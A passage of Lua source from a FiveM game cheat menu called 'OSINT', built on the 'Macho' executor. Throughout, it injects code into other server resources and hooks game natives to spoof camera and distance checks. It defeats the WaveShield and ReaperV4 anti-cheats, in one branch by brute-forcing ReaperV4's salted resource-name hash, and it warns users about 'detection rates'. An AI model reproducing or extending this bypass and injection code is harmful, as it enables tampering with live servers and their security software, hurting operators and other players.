    ["weapon_petrolcan"] = {label = "Jerry Can", hash = GetHashKey("weapon_petrolcan")},
    ["weapon_bzgas"] = {label = "BZ Gas", hash = GetHashKey("weapon_bzgas")}
}

local InjectionType = GetResourceState("WaveShield") == "started" and "Raw" or "Default" -- MachoInjectResource | MachoInjectResourceRaw
local Injection = InjectionType == "Raw" and MachoInjectResourceRaw or MachoInjectResource

---@param text string
function OSINT:Debug(color, text)
    local debugColors = { ["red"] = "^1", ["yellow"] = "^3", ["green"] = "^2", ["info"] = "^5" }
    local debugColor = debugColors[color] or "^5"
    print(("^7[^5OSINT^7]: [%sDEBUG^7] >> %s"):format(debugColor, text))
end

---@param data table
function OSINT:SendMessage(data)
    if not DUI or not data or type(data) ~= "table" then
        return
    end

    MachoSendDuiMessage(DUI, json.encode(data))
end

---@param type "success"|"error"|"info"
---@param title string
---@param desc string
---@param duration number
function OSINT:Notify(type, title, desc, duration)
    self:SendMessage({ action = "showNotification", type = type, title = title, desc = desc, duration = duration })
end

function OSINT:GetMenuPath()
    local path = { "OSINT" }

    for i = 1, #MenuLabelStack do
        table.insert(path, MenuLabelStack[i])
    end

    return path
end

---@param elements table
function OSINT:UpdateElements(elements)
    if not elements or type(elements) ~= "table" then
        return
    end

    local payload = {
        action = "updateElements",
        elements = elements,
        index = HoveredIndex - 1,
        path = self:GetMenuPath()
    }

    if CurrentCategories and type(CurrentCategories) == "table" and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = (CurrentCategoryIndex or 1) - 1
    end

    self:SendMessage(payload)
end

function OSINT:Initialize()
    DUI = MachoCreateDui("https://dih-djl-pages.js5228215.workers.dev/")
    if DUI then
        self:Debug("yellow", "Creating & Initializing DUI...")
        MachoShowDui(DUI)
        self:Debug("green", "DUI Created & Initialized Successfully!")
    else
        self:Debug("red", "Failed to Create DUI")
    end
end

function OSINT:HideUI(keepState)
    if keepState then
        LastUIState = {
            currentMenu = CurrentMenu,
            hoveredIndex = HoveredIndex,
            menuStack = MenuStack,
            menuLabelStack = MenuLabelStack,
            currentCategories = CurrentCategories,
            currentCategoryIndex = CurrentCategoryIndex
        }
    else
        LastUIState = nil
    end

    IsVisible = false
    self:SendMessage({ action = "keydown", index = 0 })
    self:SendMessage({ action = "showUI", visible = false, index = 0 })
end

function OSINT:ShowUI()
    IsVisible = true

    if LastUIState then
        CurrentMenu = LastUIState.currentMenu
        HoveredIndex = LastUIState.hoveredIndex
        MenuStack = LastUIState.menuStack
        MenuLabelStack = LastUIState.menuLabelStack
        CurrentCategories = LastUIState.currentCategories
        CurrentCategoryIndex = LastUIState.currentCategoryIndex
        LastUIState = nil
    else
        HoveredIndex = 1
        CurrentMenu = ActiveMenu
        CurrentCategories = nil
        CurrentCategoryIndex = 1
        MenuStack = {}
        MenuLabelStack = {}
    end

    local payload = {
        action = "showUI",
        visible = true,
        elements = CurrentMenu,
        index = HoveredIndex - 1,
        path = self:GetMenuPath(),
        username = Username or "OSINTBypass"
    }

    if CurrentCategories and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = CurrentCategoryIndex - 1
    end

    self:SendMessage(payload)
end

function OSINT:IsShiftHeld()
    return ShiftHolding
end

MachoOnKeyDown(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = true
    end
end)

MachoOnKeyUp(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = false
    end
end)

local CurrentKeyboardInput = nil

local function KeyboardInput(Title, Value, OnConfirm, InputType)
    if CurrentKeyboardInput then return end

    CurrentKeyboardInput = {
        title = Title,
        buffer = Value or "",
        maxLength = 32,
        onConfirm = OnConfirm,
        type = InputType or "typeable",
        closeable = InputType == "keybind" and false or true,
        active = true
    }

    MachoSendDuiMessage(DUI, json.encode({ 
        action = "updateKeyboard", 
        visible = true, 
        title = Title, 
        value = CurrentKeyboardInput.buffer 
    }))

    if GetResourceState("WaveShield") == "started" then
        MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]])
    elseif GetResourceState("ReaperV4") == "started" then
        -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
    else
        MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]])
    end

    Wait(250)
    OSINT:HideUI(true)
    MenuOpenable = false
end


MachoOnKeyDown(function(vk)
    if not CurrentKeyboardInput or not CurrentKeyboardInput.active then return end
    
    if vk == 0x0D then -- Enter
        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        if CurrentKeyboardInput.onConfirm then
            CurrentKeyboardInput.onConfirm(CurrentKeyboardInput.buffer)
        end

    if GetResourceState("WaveShield") == "started" then
        MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]])
    elseif GetResourceState("ReaperV4") == "started" then
        -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
    else
        MachoInjectResourceRaw("monitor", [[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]])
    end

        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    elseif vk == 0x08 then -- Backspace
        if CurrentKeyboardInput.type == "typeable" then
            CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer:sub(1, -2)
        else
            CurrentKeyboardInput.buffer = ""
        end
    elseif vk == 0x1B then -- Escape
        if not CurrentKeyboardInput.closeable then
            return
        end

        if GetResourceState("WaveShield") == "started" then
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]])
        elseif GetResourceState("ReaperV4") == "started" then
            -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
        else
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]])
        end
        
        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    else
        if CurrentKeyboardInput.type == "keybind" then
            local keyName = MappedKeys[vk]
            if keyName then
                if CurrentKeyboardInput.buffer ~= keyName then
                    CurrentKeyboardInput.buffer = keyName
                end
            end
        elseif CurrentKeyboardInput.type == "typeable" then
            local AllowedChars = {
                [0x30] = "0", [0x31] = "1", [0x32] = "2", [0x33] = "3", [0x34] = "4",
                [0x35] = "5", [0x36] = "6", [0x37] = "7", [0x38] = "8", [0x39] = "9",
                [0x41] = "A", [0x42] = "B", [0x43] = "C", [0x44] = "D", [0x45] = "E",
                [0x46] = "F", [0x47] = "G", [0x48] = "H", [0x49] = "I", [0x4A] = "J",
                [0x4B] = "K", [0x4C] = "L", [0x4D] = "M", [0x4E] = "N", [0x4F] = "O",
                [0x50] = "P", [0x51] = "Q", [0x52] = "R", [0x53] = "S", [0x54] = "T",
                [0x55] = "U", [0x56] = "V", [0x57] = "W", [0x58] = "X", [0x59] = "Y",
                [0x5A] = "Z", [0xBD] = "-", [0xBB] = "=", [0xBC] = ",", [0xBE] = ".",
                [0xBA] = ";", [0xDE] = "'", [0xBF] = "/", [0xC0] = "`", [0x20] = " "
            }

            local char = AllowedChars[vk]
            if char and #CurrentKeyboardInput.buffer < CurrentKeyboardInput.maxLength then
                if OSINT:IsShiftHeld() then
                    if char:match("%a") then
                        char = char:upper()
                    elseif char == "-" then
                        char = "_"
                    end
                else
                    if char:match("%a") then
                        char = char:lower()
                    end
                end

                CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer .. char
            end
        end
    end

    if CurrentKeyboardInput then
        MachoSendDuiMessage(DUI, json.encode({
            action = "updateKeyboard",
            visible = true,
            title = CurrentKeyboardInput.title,
            value = CurrentKeyboardInput.buffer
        }))
    end
end)

CreateThread(function()
    while true do
        Wait(0)

        if CurrentKeyboardInput ~= nil then
        if GetResourceState("WaveShield") == "started" then
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]])
        elseif GetResourceState("ReaperV4") == "started" then
            -- MachoIsolatedInject("monitor", [[ SetNuiFocus(true, true) ]])
        else
            MachoInjectResourceRaw("monitor", [[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]])
        end
            SetPauseMenuActive(false)

            for i = 0, 357 do
                if i < 0x30 or i > 0x5A then
                    DisableControlAction(0, i, true)
                end
            end
        else
            Wait(500)
        end
    end
end)

--- Scrolling function for normal navigation
---@param direction "Up"|"Down"
function OSINT:ScrollOne(direction)
    if not direction or #CurrentMenu == 0 then
        return
    end

    local attempts = 0
    repeat
        if direction == "Up" then
            HoveredIndex = HoveredIndex - 1
            if HoveredIndex < 1 then HoveredIndex = #CurrentMenu end
        elseif direction == "Down" then
            HoveredIndex = HoveredIndex + 1
            if HoveredIndex > #CurrentMenu then HoveredIndex = 1 end
        end
        attempts = attempts + 1
        if attempts > 200 then break end
    until CurrentMenu[HoveredIndex] and CurrentMenu[HoveredIndex].type ~= "divider"

    if DUI then
        self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
    end
end

--- Scrolling function for scrollable/slider tab navigation
---@param direction "Left"|"Right"
function OSINT:ScrollTwo(direction)
    local hoveredTab = CurrentMenu[HoveredIndex]
    if not hoveredTab then return end

    if (hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox")
        and hoveredTab.values and #hoveredTab.values > 0 then

        hoveredTab.value = hoveredTab.value or 1

        if direction == "Left" then
            hoveredTab.value = hoveredTab.value - 1
            if hoveredTab.value < 1 then hoveredTab.value = #hoveredTab.values end
        elseif direction == "Right" then
            hoveredTab.value = hoveredTab.value + 1
            if hoveredTab.value > #hoveredTab.values then hoveredTab.value = 1 end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "scrollable-checkbox" then
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value], hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value])
            end
        end
    elseif hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
        hoveredTab.value = hoveredTab.value or hoveredTab.min or 0
        local step = hoveredTab.step or 1

        if direction == "Left" then
            hoveredTab.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
        elseif direction == "Right" then
            hoveredTab.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
        end

        for _, data in pairs(MenuKeybinds) do
            if data.type == "slider-checkbox" and type(data.value) ~= "nil" and data.label == hoveredTab.label then
                if direction == "Left" then
                    data.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
                elseif direction == "Right" then
                    data.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
                else
                    return
                end
            end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "slider-checkbox" then
                hoveredTab.onSelect(hoveredTab.value, hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.value)
            end
        end
    end
end

function OSINT:Enter()
    if not CurrentMenu or #CurrentMenu == 0 then return end
    local current = CurrentMenu[HoveredIndex]
    if not current then return end
    if not MenuOpenable then return end

    if current.type == "subMenu" then
        table.insert(MenuStack, { menu = CurrentMenu, categories = CurrentCategories, categoryIndex = CurrentCategoryIndex })
        table.insert(MenuLabelStack, current.label or "Submenu")

        if current.type == "Server" then
            OSINT:UpdateListMenu()
        end

        if current.categories and type(current.categories) == "table" and #current.categories > 0 then
            CurrentCategories = current.categories
            CurrentCategoryIndex = 1
            CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        if current.subTabs and type(current.subTabs) == "table" and #current.subTabs > 0 then
            CurrentCategories = nil
            CurrentCategoryIndex = 1
            CurrentMenu = current.subTabs
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        return
    end

    if current.type == "button" and current.onSelect and type(current.onSelect) == "function" then
        local ok, err = pcall(current.onSelect)
        if not ok then self:Debug("red", "onSelect error: " .. tostring(err)) end
        return
    end

    if current.type == "checkbox" or current.type == "scrollable-checkbox" or current.type == "slider-checkbox" then
        if current.locked then
            self:Notify("error", "OSINT", "This module has been disabled due to high detection rates!", 3000)
            return
        end

        if type(current.checked) ~= "boolean" then
            current.checked = true
        else
            current.checked = not current.checked
        end

        if current.onSelect and type(current.onSelect) == "function" then
            if current.type == "scrollable-checkbox" then
                local ok, err = pcall(current.onSelect, current.values[current.value], current.checked)
                if not ok then self:Debug("red", "scrollable-checkbox onSelect error: " .. tostring(err)) end
            elseif current.type == "slider-checkbox" then
                local ok, err = pcall(current.onSelect, current.value, current.checked)
                if not ok then self:Debug("red", "slider-checkbox onSelect error: " .. tostring(err)) end
            else
                local ok, err = pcall(current.onSelect, current.checked)
                if not ok then self:Debug("red", "checkbox onSelect error: " .. tostring(err)) end
            end
        end

        self:UpdateElements(CurrentMenu)
        return
    end

    if current.type == "scrollable" or current.type == "scrollable-checkbox" then
        if current.values and type(current.values) == "table" and #current.values > 0 then
            if current.onSelect then
                current.onSelect(current.values[current.value])
            end
        end

        return
    end

    if current.type == "slider" or current.type == "slider-checkbox" then
        if current.scrollType == "onEnter" and current.onSelect then
            if current.type == "slider-checkbox" then
                current.onSelect(current.value, current.checked or false)
            else
                current.onSelect(current.value)
            end
        end
        return
    end
end

local firstFallbackBlocked = false

function OSINT:Backspace()
    if #MenuStack > 0 then
        local last = table.remove(MenuStack)
        table.remove(MenuLabelStack)
        CurrentMenu = last.menu or ActiveMenu
        CurrentCategories = last.categories
        CurrentCategoryIndex = last.categoryIndex or 1
        HoveredIndex = 1
        self:UpdateElements(CurrentMenu)
    else
        self:HideUI()
    end
end

function OSINT:PrevCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex - 1
    if CurrentCategoryIndex < 1 then CurrentCategoryIndex = #CurrentCategories end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

function OSINT:NextCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex + 1
    if CurrentCategoryIndex > #CurrentCategories then CurrentCategoryIndex = 1 end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

---@param state boolean
---@param speed number
function OSINT:ToggleFreecam(state, speed)
    if type(state) ~= "boolean" then
        return
    end

    if state then
        FreecamEnabled = true
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = true, weaponIndex = CurrentWeaponIndex, vehicleIndex = CurrentVehicleIndex }))
        if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
            if GetResourceState("WaveShield") == "started" then
                MachoHookNative(0x5234F9F10919EABA, function(...)
                    return false, -1
                end)

                MachoHookNative(0xA200EB1EE790F448, function(...)
                    return false, GetEntityCoords(PlayerPedId())
                end)

                MachoHookNative(0xC6D3D26810C8E0F9, function(...)
                    return false, false
                end)

                MachoHookNative(0x8D4D46230B2C353A, function(...)
                    return false, 0
                end)

                MachoHookNative(0xB15162CB5826E9E8, function(...)
                    return false, false
                end)

                MachoHookNative(0x19CAFA3C87F7C2FF, function(...)
                    return false, 0
                end)

                MachoHookNative(0xD5037BA82E12416F, function(...)
                    return false, 0
                end)

                MachoHookNative(0xFB92A102F1C4DFA3, function(...)
                    return false, true
                end)

                MachoHookNative(0x997ABD671D25CA0B, function(...)
                    return false, true
                end)

                _G.OSINTFreecamSpeed = speed

                if not _G.OSINTFreecamThreadRunning then
                    _G.OSINTFreecamEnabled = true
                    _G.OSINTFreecamThreadRunning = true
                
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    local function RotationToDirection(rot)
                        local z = math.rad(rot.z)
                        local x = math.rad(rot.x)
                        local num = math.abs(math.cos(x))
                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                    end

                    local function GetRightVector(rot)
                        local z = math.rad(rot.z)
                        return vector3(math.cos(z), math.sin(z), 0.0)
                    end

                    local function Clamp(val, min, max)
                        if val < min then return min end
                        if val > max then return max end
                        return val
                    end

                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                    hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    local coords = GetEntityCoords(PlayerPedId())
                    _G.OSINTFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                    SetCamCoord(_G.OSINTFreecamObject, coords.x, coords.y, coords.z + 2.0)
                    SetCamRot(_G.OSINTFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                    RenderScriptCams(true, false, 0, true, true)
                    
                    CreateThread(function()
                        while _G.OSINTFreecamThreadRunning do
                            Wait(0)

                            if _G.OSINTFreecamObject then
                                local coords = GetCamCoord(_G.OSINTFreecamObject)
                                local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                                local beforeSpeed = _G.OSINTFreecamSpeed or 0.25
                                local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                local forward = RotationToDirection(rot)
                                local right = GetRightVector(rot)
                                local moveX, moveY, moveZ = 0, 0, 0

                                TaskStandStill(PlayerPedId(), 10)
                                SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                SetCamCoord(_G.OSINTFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                local x = GetDisabledControlNormal(0, 1)
                                local y = GetDisabledControlNormal(0, 2)
                                local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                local newYaw = rot.z - x * 5

                                SetCamRot(_G.OSINTFreecamObject, newPitch, rot.y, newYaw, 2)
                            end
                        end
                    end)
                else
                    _G.OSINTFreecamEnabled = true
                end
            else
                Injection(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                print("hello im inside of a resource")
                    _G.OSINTFreecamSpeed = ]] .. speed .. [[

                    if not _G.OSINTFreecamThreadRunning then
                        _G.OSINTFreecamEnabled = true
                        _G.OSINTFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.OSINTFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.OSINTFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.OSINTFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.OSINTFreecamThreadRunning do
                                Wait(0)

                                if _G.OSINTFreecamObject then
                                    local coords = GetCamCoord(_G.OSINTFreecamObject)
                                    local rot = GetCamRot(_G.OSINTFreecamObject, 2)
                                    local beforeSpeed = _G.OSINTFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.OSINTFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.OSINTFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.OSINTFreecamEnabled = true
                    end
                ]])
            end
        else
            if not FreecamBypassReaperV4 then
                print("[^5OSINT^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass")

                local function GetReaperV4SecurityResource()
                    local debugPrint = false

                    local function reaperHash(input, salt)
                        salt = salt or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1"
                        input = input .. salt

                        local hashValue = 5381

                        for i = 1, #input do
                            local byte = string.byte(input, i)
                            hashValue = (hashValue * 33) ~ byte
                        end

                        return hashValue
                    end

                    local targetStr = GetConvar("reaper_security_resource", "")
                    local target = tonumber(targetStr)
                    if not target then
                        return
                    end

                    local numResources = GetNumResources() or 0
                    local candidates = {}
                    for idx = 0, (numResources - 1) do
                        local resName = GetResourceByFindIndex(idx)
                        if resName and resName ~= "" then
                            table.insert(candidates, resName)
                        end
                    end

                    if #candidates == 0 then
                        return
                    end

                    local tried = 0
                    local found = nil
                    for i, cand in ipairs(candidates) do
                        tried = tried + 1
                        if reaperHash(cand) == target then
                            print("^7[^5OSINT^7]: [^3DEBUG^7]: Reaper Security Resource Found: " .. cand)
                            found = cand
                            break
                        end

                        local alt = cand:gsub("[-_]", "")
                        if alt ~= cand and reaperHash(alt) == target then
                            found = alt
                            break
                        end

                        if tried % 50 == 0 then
                            Wait(0)
                        end
                    end

                    if found then
                        return found
                    end
                end

                local resource = GetReaperV4SecurityResource()

                MachoInjectResource("ReaperV4", [[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]])

                Wait(250)

                if resource then
                    MachoInjectResource(resource, [[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
